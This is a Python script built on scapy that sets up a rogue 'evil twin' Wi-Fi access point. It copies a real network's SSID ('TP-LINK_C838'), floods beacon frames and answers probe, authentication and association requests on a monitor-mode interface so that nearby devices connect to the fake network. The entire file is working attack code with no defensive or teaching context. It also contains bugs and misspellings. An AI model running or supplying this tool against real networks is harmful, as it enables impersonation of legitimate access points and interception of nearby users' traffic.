import random
import time
from scapy.all import *
from scapy.layers.all import *
from scapy.layers.dot11 import *
from scapy.layers.l2 import *

import pywifi
import pywifi.const as c
import sys
import firegod.wifi as firegod_wifi
import firegod.wifi.scan as scaner
import threading as t
import multiprocessing as mp

class facke_ap():
    cap = 'ESS'

    def __init__(self, name):
        self.fake_name = name
        pass

    def fake_one_target(self, ap_name=None, ap_mac=None, ):
        self.target_name = ap_name if ap_name else self.fake_name
        if ap_mac is None and (ap_name is not None):
            # print("if")
            self.scaner = scaner.wifi_pywifi()
            self.wifi_list = self.scaner.wifi_scan_pywifi(1)
            for x in self.wifi_list:
                self.target_wifi_mac = x["mac"] if x["ssid"] == ap_name else None
                print(self.target_wifi_mac)
        else:
            # print("yes")
            self.target_wifi_mac = RandMAC()

            # print(self.target_wifi_mac)
        self.fake_wifi_mac = RandMAC()
        self.fake_beacom = RadioTap() / Dot11(subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2="00:0f:11:83:09:39",
                                              addr3="00:0f:11:83:09:39") / \
                           Dot11Beacon(cap=self.cap) / Dot11Elt(ID='SSID', info=self.fake_name, len=len(self.fake_name))

    def send_fake(self, iface):
        def send_():
            nonlocal iface
            while 1:
                sendp(self.fake_beacom, iface=iface ,inter=0.001, count=5)

        self.send_th = mp.Process(target=send_)
        self.send_th.start()

    def call_back(self, pk):
        if pk.haslayer(Dot11Auth):
            print("asdasda"*20)
            print(pk.show())
            # print(pk.fcs)
            sendau = RadioTap() / \
                     Dot11(addr1=pk[Dot11].addr2, addr2="00:0f:11:83:09:39", addr3="00:0f:11:83:09:39")/ \
                     Dot11Auth(algo=0,seqnum=2,status=0)
            sendp(sendau,iface="wlan1mon",count=2,inter=0.001)

        if pk.haslayer(Dot11AssoReq):
            print("454545" * 20)
            print(pk.show())
            sendsso = RadioTap() / \
                     Dot11(addr1=pk[Dot11].addr2, addr2="00:0f:11:83:09:39", addr3="00:0f:11:83:09:39") / \
                     Dot11AssoResp(AID = 2)/ \
                     Dot11Elt(ID="Rates", info="\x82\x84\x0b\x16")/ \
                     Dot11Elt(ID="ESRates", info="\x82\x84\x0b\x16")
            sendp(sendsso,iface="wlan1mon", count = 5,inter=0.001)

        if pk.haslayer(Dot11ProbeReq):
            # print(pk.show())
            # print(pk[Dot11].addr2)
            # print(pk.Rate)
            if pk[Dot11].addr1 == "00:0f:11:83:09:39":
                print("----1-1-11-1-1-1-"*10)
                print(pk[Dot11])
                pksend = RadioTap() / \
                         Dot11(addr1=pk[Dot11].addr2, addr2="00:0f:11:83:09:39", addr3="00:0f:11:83:09:39") / \
                         Dot11ProbeResp(cap=self.cap) / \
                         Dot11Elt(ID='SSID', info=self.fake_name, len=len(self.fake_name) )/ \
                         Dot11Elt(ID="Rates", info="\x82\x84\x0b\x16" )/ \
                         Dot11Elt(ID="DSset", info="\x01") / \
                         Dot11Elt(ID="ESRates", info="\x82\x84\x0b\x16")
                sendp(pksend, iface="wlan1mon",count=5,inter=0.001)



    def get_conect(self, iface):
        def sniff_():
            nonlocal iface
            sniff(iface=iface, prn=self.call_back)

        self.sniff_th = mp.Process(target=sniff_)
        self.sniff_th.start()

    def jion(self):
        for x in [self.sniff_th, self.send_th]:
            x.join


if __name__ == "__main__":
    f = facke_ap("TP-LINK_C838")
    f.fake_one_target("TP-LINK_C838")
    f.send_fake("wlan1mon")
    f.get_conect("wlan1mon")
    f.jion()
